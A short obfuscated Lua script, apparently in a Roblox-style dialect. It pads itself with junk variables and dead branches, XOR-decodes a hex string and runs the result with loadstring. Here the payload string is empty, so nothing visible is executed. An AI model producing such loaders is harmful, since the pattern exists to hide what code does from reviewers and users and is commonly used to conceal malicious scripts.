local ZGdGLe = 977 + 445; if false then local RMmnTqfOdw = "kshxvw1v47f" end;
local iWxmW = ""
local cObD = ""
local NFPnIgFh = iWxmW..cObD
local IGcRS = ""
local zGieKqDS = 257 + 42; if false then local JeDQotq = "w9ez9bxy1p" end;
local rtBNnigYW = 236
local MyKMbJb = bit32.bxor(28, rtBNnigYW)
local aErnLlBv = bit32.bxor(218, rtBNnigYW)
local uUJHRBG = bit32.bxor(169, rtBNnigYW)
for PoFF = 1, #NFPnIgFh, 2 do
    local lBBPkZujJF = 1 + 277; if false then local nJkSuFoyJ = "rtgra9a0y1" end;
    local aWyAD = tonumber(NFPnIgFh:sub(PoFF, PoFF+1), 16)
    aWyAD = bit32.bxor(aWyAD, MyKMbJb)
    aWyAD = bit32.bxor(aWyAD, aErnLlBv)
    aWyAD = bit32.bxor(aWyAD, uUJHRBG)
    IGcRS = IGcRS .. string.char(aWyAD)
end
loadstring(IGcRS)()
